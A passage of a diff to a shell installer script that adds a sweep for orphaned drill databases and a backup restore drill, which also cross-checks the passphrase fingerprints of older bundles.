+      if [ -z "$age" ]; then
+        bk_fail "could not read the age of $db, so nothing can say it is an orphan
+       rather than a drill that started a moment ago. Drop it by hand if it is."
+        failures=$((failures + 1))
+        continue
+      fi
+      if [ "$age" -ne 1 ]; then
+        kept=$((kept + 1))
+        continue
+      fi
+      if bk_psql "$pgid" postgres "DROP DATABASE IF EXISTS $(bk_sql_ident "$db")" >/dev/null 2>&1; then
+        removed=$((removed + 1))
+      else
+        bk_fail "the orphaned drill database $db would not drop."
+        failures=$((failures + 1))
+      fi
+    done <<EOF
+$rows
+EOF
+  fi
+
+  printf 'sweep: %s orphaned object(s) removed and verified gone, %s left alone as a\n' \
+    "$removed" "$kept"
+  printf '       live run or an in-use database\n'
+  if [ "$failures" -ne 0 ]; then
+    bk_fail "the sweep could not finish: $failures object(s) named above would not go.
+       A drill does not run on top of wreckage it could not clear."
+    return 1
+  fi
+  return 0
+}
+
+# ── `./install drill` (§9.4) ────────────────────────────────────────────────
+#
+# The question it answers is "could I recover from disaster today", and THE
+# EXIT CODE IS THE VERDICT.
+bk_drill_run() {
+  local out="" dir bundles newest newest_stamp now age rc=0
+  local base stamp pw pw_source line stale kept n crypto_img tmp fp recorded
+
+  while [ $# -gt 0 ]; do
+    case "$1" in
+      --out) shift; out="${1:-}" ;;
+      --out=*) out="${1#--out=}" ;;
+      -h | --help)
+        printf './install drill [--out DIR]\n'
+        return 0
+        ;;
+      *)
+        bk_fail "drill: unknown option '$1'. Usage: ./install drill [--out DIR]"
+        return 2
+        ;;
+    esac
+    shift
+  done
+  [ -n "$out" ] || out="$(bk_out_dir)"
+  dir="$out"
+
+  # ── 1. the sweep ─────────────────────────────────────────────────────────
+  bk_drill_sweep || return 1
+
+  # ── 2. the bundles. ZERO IS A FAILED DRILL, not a vacuous pass ──────────
+  bundles="$(find "$dir" -maxdepth 1 -type f -name '*.tar' 2>/dev/null | LC_ALL=C sort)"
+  n="$(printf '%s\n' "$bundles" | sed '/^$/d' | wc -l | tr -d ' ')"
+  if [ "$n" -eq 0 ]; then
+    bk_fail "there is no bundle in $dir. The question a drill answers is \"could I
+       recover from disaster today\", and with nothing to recover from the answer
+       is NO. That is a FAILED drill, not a drill with nothing to do."
+    return 1
+  fi
+
+  # ── 3. the newest, by the stamp in its own name ─────────────────────────
+  newest=""
+  newest_stamp=""
+  while IFS= read -r line; do
+    [ -n "$line" ] || continue
+    base="$(basename "$line")"
+    stamp="$(bk_bundle_stamp "$base")" || {
+      bk_fail "$base carries no YYYYMMDDTHHMMSSZ stamp this tool can parse. A drill
+       never picks by mtime — a file copied off a removable drive carries the
+       copy's time, not the backup's."
+      return 1
+    }
+    if [ -z "$newest_stamp" ] || bk_str_ge "$stamp" "$newest_stamp"; then
+      newest_stamp="$stamp"
+      newest="$line"
+    fi
+  done <<EOF
+$bundles
+EOF
+
+  now="$(date +%s)"
+  age="$(bk_stamp_epoch "$newest_stamp")" || age=""
+  if [ -n "$age" ]; then
+    age=$(((now - age) / 86400))
+  fi
+  printf 'drill: %s bundle(s) in %s; the newest is %s\n' "$n" "$dir" "$(basename "$newest")"
+  if [ -n "$age" ]; then
+    printf '       stamped %s, %s day(s) old\n' "$newest_stamp" "$age"
+  else
+    printf '       stamped %s\n' "$newest_stamp"
+  fi
+
+  # ── 4. the drill itself ──────────────────────────────────────────────────
+  bk_restore_run "$newest" --drill || return 1
+
+  # ── 5. the cross-check a drill alone cannot surface ─────────────────────
+  #
+  # Every OLDER bundle's cleartext passphrase_fingerprint, against what the
+  # CONFIGURED passphrase derives under THAT bundle's own kat.enc salt (§7.4,
+  # s41/rulings.md C). No decryption, and no passphrase for those bundles is
+  # needed. Any that differ need the PREVIOUS passphrase, and the operator
+  # should know that before he needs them — which is the one thing a drill of
+  # the newest bundle can never tell him.
+  pw_source="$(nova_passphrase_source)"
+  rc=0
+  pw="$(resolve_passphrase)" || rc=$?
+  if [ "$rc" -ne 0 ] || [ -z "$pw" ]; then
+    bk_fail "the drill restored, and the configured passphrase ('$pw_source') could not
+       be resolved afterwards, so the older bundles were NOT cross-checked. That
+       half of the drill did not run."
+    return 1
+  fi
+  crypto_img="$(bk_crypto_image)" || return 1
+  tmp="$(mktemp -d "${TMPDIR:-/tmp}/nova-drill-fp.XXXXXX")" || return 1
+  chmod 700 "$tmp"
+  stale=""
+  kept=0
+  while IFS= read -r line; do
+    [ -n "$line" ] || continue
+    [ "$line" = "$newest" ] && continue
+    base="$(basename "$line")"
+    if ! tar -xOf "$line" kat.enc > "$tmp/kat.enc" 2>/dev/null || [ ! -s "$tmp/kat.enc" ]; then
+      stale="$stale
+       $base — it carries no readable kat.enc, so nothing can say which
+       passphrase seals it"
+      continue
+    fi
+    recorded="$(tar -xOf "$line" meta.json 2>/dev/null | bk_json_field passphrase_fingerprint)" || recorded=""
+    fp="$(printf '%s\n' "$pw" | bk_nova -v "$tmp:/fp:ro" "$crypto_img" \
+      python3 /novabundle/novabundle.py fingerprint --file /fp/kat.enc 2>/dev/null)" || fp=""
+    if [ -z "$fp" ] || [ -z "$recorded" ]; then
+      stale="$stale
+       $base — its fingerprint could not be derived or read"
+      continue
+    fi
+    if [ "$fp" != "$recorded" ]; then
+      stale="$stale
+       $base (records $recorded, this passphrase derives $fp)"
+    else
+      kept=$((kept + 1))
+    fi
+  done <<EOF
+$bundles
+EOF
+  rm -rf "$tmp"
+
+  # ── 6. the report ────────────────────────────────────────────────────────
+  if [ -n "$stale" ]; then
+    printf '\n'
+    bk_fail "the newest bundle restores, AND these older bundles are not sealed with
+       the passphrase configured here:$stale
+
+       They need the PREVIOUS passphrase. Keep it, or write a fresh backup you
+       can open — a bundle nobody can open is not a backup."
+    return 1
+  fi
+  printf 'passphrases: %s older bundle(s) checked, every one sealed with the passphrase\n' "$kept"
+  printf '             configured here (derived under each bundle'"'"'s own salt, no decrypt)\n'
+  printf '\ndrill PASSED: %s\n' "$(basename "$newest")"
   return 0
 }
 
